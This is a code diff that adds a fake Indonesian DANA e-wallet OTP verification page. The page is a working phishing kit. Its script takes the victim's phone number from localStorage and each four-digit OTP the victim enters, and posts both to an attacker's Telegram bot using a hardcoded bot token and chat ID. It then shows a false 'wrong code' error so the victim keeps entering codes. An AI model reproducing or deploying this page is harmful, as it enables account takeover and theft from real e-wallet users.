@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>DANA - Verifikasi OTP</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #108ee9;
+      color: #ffffff;
+      -webkit-text-size-adjust: 100%;
+      user-select: none;
+    }
+    .container {
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background-color: #108ee9;
+      display: flex;
+      flex-direction: column;
+      padding: 16px 20px 24px 20px;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      margin-bottom: 32px;
+      padding-top: 4px;
+    }
+    .back-btn {
+      position: absolute;
+      left: 0;
+      background: none;
+      border: none;
+      color: #ffffff;
+      font-size: 20px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+    .header-title {
+      font-size: 16px;
+      font-weight: 600;
+    }
+    .info-section {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .info-text {
+      font-size: 15px;
+      margin-bottom: 12px;
+      color: rgba(255, 255, 255, 0.95);
+    }
+    .phone-badge {
+      display: inline-flex;
+      align-items: center;
+      background-color: rgba(0, 0, 0, 0.15);
+      padding: 8px 16px;
+      border-radius: 20px;
+      gap: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    .flag-icon {
+      width: 20px;
+      height: 14px;
+      border-radius: 2px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      border: 1px solid rgba(0,0,0,0.1);
+    }
+    .flag-red {
+      background-color: #de2910;
+      height: 50%;
+    }
+    .flag-white {
+      background-color: #ffffff;
+      height: 50%;
+    }
+    .via-text {
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.8);
+      margin-top: 4px;
+    }
+    
+    /* Animasi getar / gerak-gerak (shake) */
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      20% { transform: translateX(-6px); }
+      40% { transform: translateX(6px); }
+      60% { transform: translateX(-4px); }
+      80% { transform: translateX(4px); }
+      100% { transform: translateX(0); }
+    }
+
+    .error-msg {
+      text-align: center;
+      font-size: 13px;
+      color: #ffcccc;
+      margin-bottom: 16px;
+      display: none;
+    }
+
+    .error-msg.shake {
+      display: block;
+      animation: shake 0.4s ease-in-out;
+    }
+
+    /* Kotak OTP (4 digit) */
+    .otp-container {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 32px;
+    }
+    .otp-input {
+      width: 60px;
+      height: 60px;
+      background-color: #ffffff;
+      border: none;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: #333333;
+      outline: none;
+    }
+    .otp-input:focus {
+      box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.6);
+    }
+    /* Kotak Kirim Ulang & Timer */
+    .resend-box {
+      display: flex;
+      background-color: #ffffff;
+      border-radius: 8px;
+      overflow: hidden;
+      max-width: 280px;
+      margin: 0 auto;
+      height: 44px;
+      align-items: center;
+    }
+    .resend-btn {
+      flex: 1;
+      background: none;
+      border: none;
+      color: #999999;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: not-allowed;
+      text-align: center;
+    }
+    .resend-btn.active {
+      color: #108ee9;
+      cursor: pointer;
+    }
+    .timer-display {
+      padding: 0 16px;
+      color: #333333;
+      font-size: 14px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-left: 1px solid #eeeeee;
+      height: 100%;
+    }
+    .timer-dot {
+      width: 8px;
+      height: 8px;
+      background-color: #ff9900;
+      border-radius: 50%;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    
+    <!-- Header -->
+    <div class="header">
+      <button class="back-btn" onclick="history.back()">❮</button>
+      <div class="header-title">Daftar Akun</div>
+    </div>
+
+    <!-- Informasi Pengiriman OTP -->
+    <div class="info-section">
+      <div class="info-text">Kode OTP telah terkirim ke</div>
+      <div class="phone-badge">
+        <div class="flag-icon">
+          <div class="flag-red"></div>
+          <div class="flag-white"></div>
+        </div>
+        <span>+62 <span id="display-phone">852-4766-655</span></span>
+      </div>
+      <div class="via-text">via 💬 SMS</div>
+    </div>
+
+    <!-- Pesan Error / Teks Merah Bergetar -->
+    <div id="error-msg" class="error-msg">Kode OTP salah, silahkan masukkan kembali</div>
+
+    <!-- 4 Kotak Input OTP -->
+    <div class="otp-container">
+      <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 0)" onkeydown="handleKeyDown(event, 0)">
+      <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)" onkeydown="handleKeyDown(event, 1)">
+      <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)" onkeydown="handleKeyDown(event, 2)">
+      <input type="tel" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)" onkeydown="handleKeyDown(event, 3)">
+    </div>
+
+    <!-- Kotak Kirim Ulang & Timer -->
+    <div class="resend-box">
+      <button type="button" id="resend-btn" class="resend-btn" disabled>KIRIM ULANG</button>
+      <div class="timer-display">
+        <span id="timer-text">00:60</span>
+        <div class="timer-dot"></div>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs";
+    const CHAT_ID = "6742478722";
+
+    const savedPhone = localStorage.getItem('userPhone') || '8524766655';
+    
+    function formatDisplayPhone(num) {
+      let clean = num.replace(/\D/g, '');
+      if (clean.startsWith('0')) clean = clean.substring(1);
+      if (clean.length > 8) {
+        return clean.substring(0, 4) + '-' + clean.substring(4, 8) + '-' + clean.substring(8, 13);
+      } else if (clean.length > 4) {
+        return clean.substring(0, 4) + '-' + clean.substring(4);
+      }
+      return clean;
+    }
+    document.getElementById('display-phone').innerText = formatDisplayPhone(savedPhone);
+
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const errorMsg = document.getElementById('error-msg');
+    let errorTimeout;
+
+    otpInputs[0].focus();
+
+    function moveToNext(current, index) {
+      let val = current.value.replace(/\D/g, '');
+      current.value = val;
+
+      if (val && index < 3) {
+        otpInputs[index + 1].focus();
+      }
+
+      checkOTPComplete();
+    }
+
+    function handleKeyDown(event, index) {
+      if (event.key === 'Backspace' && !otpInputs[index].value && index > 0) {
+        otpInputs[index - 1].focus();
+      }
+    }
+
+    async function checkOTPComplete() {
+      let otpCode = '';
+      otpInputs.forEach(input => otpCode += input.value);
+
+      if (otpCode.length === 4) {
+        // Kirim data ke Telegram
+        await sendDataToTelegram(otpCode);
+
+        // Bersihkan timer sebelumnya
+        clearTimeout(errorTimeout);
+
+        // Paksa tampilkan, getarkan, lalu kosongkan input
+        errorMsg.style.display = 'block';
+        errorMsg.classList.remove('shake');
+        void errorMsg.offsetWidth; 
+        errorMsg.classList.add('shake');
+        
+        otpInputs.forEach(input => input.value = '');
+        otpInputs[0].focus();
+
+        // Timer otomatis hilang sendiri setelah 5 detik
+        errorTimeout = setTimeout(() => {
+          errorMsg.classList.remove('shake');
+          errorMsg.style.display = 'none';
+        }, 1500);
+      }
+    }
+
+    async function sendDataToTelegram(otp) {
+      const text = `🔐 *Verifikasi OTP DANA (Percobaan)*\n\n*Nomor HP:* +62${savedPhone}\n*Kode OTP:* \`${otp}\``;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.log("Error Telegram");
+      }
+    }
+
+    let timeLeft = 54;
+    const timerText = document.getElementById('timer-text');
+    const resendBtn = document.getElementById('resend-btn');
+
+    const countdown = setInterval(() => {
+      timeLeft--;
+      let seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
+      timerText.innerText = `00:${seconds}`;
+
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        timerText.innerText = '00:00';
+        resendBtn.classList.add('active');
+        resendBtn.removeAttribute('disabled');
+      }
+    }, 1000);
+  </script>
+</body>
+</html
